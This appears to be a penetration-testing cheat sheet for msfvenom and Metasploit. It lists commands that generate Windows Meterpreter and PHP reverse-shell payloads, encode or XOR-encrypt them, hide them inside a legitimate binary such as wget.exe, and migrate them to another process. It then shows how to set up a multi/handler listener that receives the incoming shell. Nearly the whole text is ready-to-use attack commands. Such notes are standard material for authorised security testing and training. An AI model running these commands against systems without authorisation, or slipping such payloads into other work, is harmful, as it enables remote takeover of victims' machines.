Usage:
  msfvenom -p <OS>/<ARCH>/<PAYLOAD> LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> -f exe -o rev_shell.exe
Example Usage:
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> -f exe -o rev_shell.exe

Options:
  -p                   payload
  -f                   format
  -e                   encoder type
  --encrypt xor --encrypt-key 
                       build XOR encrypted payload (you need to specify a key)
  -i                   number of iterations for encoding e.g. 3
  -o                   output-file
  -k                   keep functionality in the binary (if using e.g. wget.exe as obfuscation template)
  PrependMigrate=true  add a migration to a new process at the beginning of the code,
                       making out shell live longer than the process itself (usefull when using -k option)
  LHOST=<LOCAL_IP>
  LPORT=<LOCAL_PORT> (listening port)

Payload formats:
  windows/x64/meterpreter/reverse_tcp
                            Windows 64bit staged Meterpreter payload
  linux/x86/meterpreter_reverse_tcp
                            Linux 32bit stageless Meterpreter payload

Commands:
  msfvenom -l payloads      Show all payloads available
  msfvenom -l encoders      Show all encoders available
  msfvenom -l encrypt       List the available encryption algorithms
  msfvenom -l payloads | grep meterpreter   Show all payloads available for meterpreter
  msfvenom -l encoders | grep excellent     Show all excellent encoders available
  msfvenom --list formats   List supported output formats. You can either generate stand-alone payloads 
                            (Windows executable for Meterpreter) or get a usable raw format (e.g. python)
  msfvenom -f raw -e php/base64
                            Encoding (with the -e parameter), in Base64, and the output format generate as raw. Encoders do not aim
                            to bypass antivirus installed on the target system. As the name suggests, they encode the payload


Example Using Handler for Reverse Shell:
  msfvenom -p php/reverse_php LHOST=<LOCAL>IP> LPORT=<LOCAL_PORT> -f raw > reverse_shell.php
                              Generate reverse shell payload, use the same values to set up exploit/multi/handler module (listener)
  use exploit/multi/handler   Use Multi Handler to receive the incoming connection. Multi handler supports all Metasploit payloads
                              and can be used for Meterpreter as well as regular shells
  set payload php/reverse_php
  set lhost <LOCAL_IP>
  set lport <LOCAL_PORT>
  run                         When the reverse shell is triggered, the connection will be received by multi/handler and provide us with a *shell*
                              If the payload was set as Meterpreter (e.g. in a Windows executable format), multi/handler would then provide us with a *Meterpreter shell*
